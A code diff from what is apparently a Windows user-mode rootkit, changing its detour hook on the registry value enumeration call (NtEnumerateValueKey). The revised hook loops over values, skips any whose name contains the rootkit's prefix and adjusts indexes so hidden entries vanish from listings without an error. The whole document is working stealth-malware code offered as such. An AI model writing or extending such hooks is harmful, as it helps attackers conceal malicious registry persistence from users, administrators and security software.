@@ -321,35 +321,66 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	// RESTORE
 	detour::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));
 
-	// CALL	
-	auto result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);
+	// WE NEED TO SAVE INDEXES NOT TO DISPLAY SAME KEY TWICE AFTER REPLACING THE HIDDEN ONES
+	thread_local int last_replaced = -1;
+	thread_local HANDLE last_handle = key_handle;
 
-	// REHOOK
-	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));
+	// WE ARE NOT ITERATING OVER A NEW KEYS LIST
+	if(last_handle != key_handle) {
+		last_handle  = key_handle;
+		last_replaced = -1;
+	}
+	
+	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
+	if(index < last_replaced)
+	{
+		index = last_replaced + 1;
+		++last_replaced;
+	}
 
-	// DON'T MODIFY ON FAILURE
-	if (result != STATUS_SUCCESS)
-		return result;
-
-	// FETCH REGISTRY KEY NAME
+	NTSTATUS result;
 	std::wstring name;
-	if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
+	while (true)
 	{
-		auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
-		name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
-	}
-	else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
-	{
-		auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
-		name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+		// CALL	
+		result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);
+
+		// SOMETHING FAILED OR WE REACHED THE END OF LIST
+		if(!NT_SUCCESS(result))
+		{
+			// RESET THE INDEX OF LAST REPLACED REGISTRY VALUE
+			last_replaced = -1;
+			break;
+		}
+
+		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
+		{
+			auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
+			name	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+		}
+		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
+		{
+			auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
+			name 	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+		}
+		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
+			break;
+
+		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP
+		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
+		{
+			// UPDATE THE INDEX OF LAST REPLACEMENT
+			last_replaced = index;
+			break;
+		}
+
+		// ELSE CLEAR THE CURRENT HELD INFORMATION AND INCREASE THE INDEX TO CHECK NEXT VALUE
+		std::memset(key_value_info, 0, length);
+		++index;			
 	}
 
-	// HIDE ANY PROTECTED ENTRIES
-	if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-	{
-		ZeroMemory(key_value_info, *return_length);
-		return STATUS_INVALID_PARAMETER;
-	}
+	// 'REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));
 
 	return result;
 }
